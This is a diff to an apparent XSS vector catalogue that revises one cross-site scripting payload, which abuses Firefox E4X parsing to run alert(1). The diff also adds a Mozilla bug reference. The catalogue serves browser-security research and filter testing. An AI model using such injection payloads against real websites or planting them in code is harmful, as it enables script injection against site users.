@@ -1811,14 +1811,14 @@ var items =
             'ru' : '',
             'de' : ''
         },
-        'data'       : '<b<script<b/><alert(1)//</script>0',
+        'data'       : '<b><script<b></b>,alert(1)</script </b>',
         'description': {
             'en' : 'This one is tricky. Firefox allows to end an opening <SCRIPT> tag with a new E4X object (<b/>) - already being created in the JavaScript scope at the same time. The alert can happen due to the fact that the additional < introduces a size comparison (<b/> < alert(1)).',
             'jp' : '',
             'ru' : '',
             'de' : ''
         },
-        'urls'    : ['https://developer.mozilla.org/en/E4X'],
+        'urls'    : ['https://developer.mozilla.org/en/E4X', 'https://bugzilla.mozilla.org/show_bug.cgi?id=564706'],
         'howtofix'   : {
             'en' : '',
             'ja' : '',
